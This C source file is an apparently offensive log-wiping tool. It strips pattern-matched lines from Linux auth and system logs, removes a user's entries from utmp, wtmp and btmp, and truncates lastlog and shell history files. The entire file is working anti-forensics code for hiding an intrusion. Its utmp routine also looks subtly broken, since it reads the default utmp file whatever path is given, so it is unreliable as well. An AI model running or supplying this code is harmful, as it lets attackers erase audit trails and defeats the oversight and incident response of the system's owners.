#define _GNU_SOURCE
#include <sys/stat.h>
#include <utmp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <errno.h>

static const char *text_logs[] = {
    "/var/log/auth.log",
    "/var/log/syslog",
    "/var/log/messages",
    "/var/log/secure",
    "/var/log/kern.log",
    "/var/log/user.log",
    NULL
};

static void wipe_text_log(const char *path, const char *pattern, int dry_run)
{
    FILE *r = fopen(path, "r");
    if (!r) { fprintf(stderr, "  [!] %s: %s\n", path, strerror(errno)); return; }

    char tmp[512];
    snprintf(tmp, sizeof(tmp), "%s.XXXXXX", path);
    int tfd = mkstemp(tmp);
    if (tfd < 0) { perror("mkstemp"); fclose(r); return; }

    FILE *w = fdopen(tfd, "w");
    char line[4096];
    int removed = 0, total = 0;

    while (fgets(line, sizeof(line), r)) {
        total++;
        if (pattern && strstr(line, pattern)) {
            removed++;
            if (dry_run) printf("  [would remove] %s", line);
        } else {
            if (!dry_run) fputs(line, w);
        }
    }
    fclose(r); fclose(w);

    if (!dry_run) {
        struct stat st;
        stat(path, &st);
        rename(tmp, path);
        chmod(path, st.st_mode);
        printf("  [+] %s: removed %d/%d lines\n", path, removed, total);
    } else {
        unlink(tmp);
        printf("  [dry-run] %s: would remove %d/%d lines\n", path, removed, total);
    }
}

static void wipe_utmp(const char *path, const char *user, int dry_run)
{
    struct utmp *ut;
    struct utmp entries[4096];
    int count = 0;

    FILE *f = fopen(path, "rb");
    if (!f) { fprintf(stderr, "  [!] %s: %s\n", path, strerror(errno)); return; }
    while ((ut = getutent()) != NULL && count < 4096) {
        if (user && strncmp(ut->ut_user, user, UT_NAMESIZE) == 0) continue;
        entries[count++] = *ut;
    }
    endutent();
    fclose(f);

    if (!dry_run) {
        FILE *w = fopen(path, "wb");
        if (!w) { perror(path); return; }
        for (int i = 0; i < count; i++)
            fwrite(&entries[i], sizeof(struct utmp), 1, w);
        fclose(w);
        printf("  [+] %s: kept %d entries (removed entries for '%s')\n",
               path, count, user ? user : "(none)");
    } else {
        printf("  [dry-run] %s: would keep %d entries\n", path, count);
    }
}

static void cmd_wipe(const char *pattern, int dry_run)
{
    for (int i = 0; text_logs[i]; i++) {
        if (access(text_logs[i], F_OK) != 0) continue;
        wipe_text_log(text_logs[i], pattern, dry_run);
    }
}

static void cmd_utmp(const char *user, int dry_run)
{
    const char *utmp_files[] = {
        "/var/run/utmp", "/var/log/wtmp", "/var/log/btmp", NULL
    };
    for (int i = 0; utmp_files[i]; i++) {
        if (access(utmp_files[i], F_OK) != 0) continue;
        wipe_utmp(utmp_files[i], user, dry_run);
    }
}

static void cmd_lastlog(const char *user)
{
    if (truncate("/var/log/lastlog", 0) == 0)
        printf("[+] truncated /var/log/lastlog (clears all last-login records)\n");
    else
        perror("/var/log/lastlog");
    (void)user;
}

static void cmd_bash(const char *user_home)
{
    char path[512];
    snprintf(path, sizeof(path), "%s/.bash_history", user_home);
    if (truncate(path, 0) == 0) printf("[+] truncated %s\n", path);
    else perror(path);

    snprintf(path, sizeof(path), "%s/.zsh_history", user_home);
    if (truncate(path, 0) == 0) printf("[+] truncated %s\n", path);

    snprintf(path, sizeof(path), "%s/.python_history", user_home);
    if (truncate(path, 0) == 0) printf("[+] truncated %s\n", path);

    printf("[*] also consider: unset HISTFILE before launching shell\n");
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr, "usage: %s <wipe|utmp|lastlog|hist>\n", argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "wipe") == 0 && argc >= 3) {
        int dry = argc >= 4 && strcmp(argv[3], "--dry") == 0;
        cmd_wipe(argv[2], dry);
    } else if (strcmp(argv[1], "utmp") == 0 && argc >= 3) {
        int dry = argc >= 4 && strcmp(argv[3], "--dry") == 0;
        cmd_utmp(argv[2], dry);
    } else if (strcmp(argv[1], "lastlog") == 0) {
        cmd_lastlog(NULL);
    } else if (strcmp(argv[1], "hist") == 0 && argc >= 3) {
        cmd_bash(argv[2]);
    } else {
        fprintf(stderr, "unknown: %s\n", argv[1]); return 1;
    }
    return 0;
}
